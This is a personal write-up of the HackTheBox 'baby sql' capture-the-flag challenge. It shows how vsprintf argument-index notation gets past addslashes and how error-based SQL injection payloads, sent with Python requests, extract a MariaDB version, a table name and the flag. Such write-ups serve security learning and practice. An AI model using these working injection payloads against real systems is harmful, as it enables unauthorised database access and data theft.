# baby sql

Completed: Yes
Platform: HackTheBox

The challenge contains the source code of index.php with `addslashes()` and `vsprintf`. Firstly, I tried to target `addslashes` function and found that it can be bypassed with `0bf27` code([http://khlo.co.uk/index.php/1302-Addslashes-Allows-Sql-Injection-Attacks](http://khlo.co.uk/index.php/1302-Addslashes-Allows-Sql-Injection-Attacks)), but here it doesn't work. So, I moved to `vsprintf`. I didn't know how it works in PHP, I looked at the man page of a function. And I found nothing for me as I thought first. I copied a part of the code to myself and started apache2. Thus, I understood, that the function `addslashes` add slashes to ' and ". So, I had to bypass somehow its condition. [https://www.php.net/manual/en/function.vsprintf.php](https://www.php.net/manual/en/function.vsprintf.php) said that the vsprintf has the functionality to use "index of argument", something like `1$`. Also, I found out that in examples people use this notation: `%2$`. So, I tried it with a single quote at the end and passed the filter.  

```python
>>> res = requests.post('http://142.93.35.92:32333', data={"pass":"%1$')"})
>>> res.text
"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') AND username=('admin')' at line 1"
```

Then, I just used PayloadsAllTheThings([https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL injection/MySQL Injection.md](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md)) and found a flag.

```python
>>> res = requests.post('http://142.93.35.92:32333', data={"pass":"%1$') AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))#"})
>>> res.text
"XPATH syntax error: '~10.5.5-MariaDB~'"
```

```python
>>> res = requests.post('http://142.93.35.92:32333', data={"pass":"%1$') AND extractvalue(rand(),concat(CHAR(126),(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),CHAR(126)))#"})
>>> res.text
"XPATH syntax error: '~totally_not_a_flag~'"
```

```python
>>> res = requests.post('http://142.93.35.92:32333', data={"pass":"%1$') AND extractvalue(rand(),concat(CHAR(126),(select * from totally_not_a_flag),CHAR(126)))#"})
>>> res.text
"XPATH syntax error: '~HTB{h0w_d1d_y0u_f1nd_m3?}~'"
```

I dunno why this challenges are called `baby`. They are not such `baby` level at all.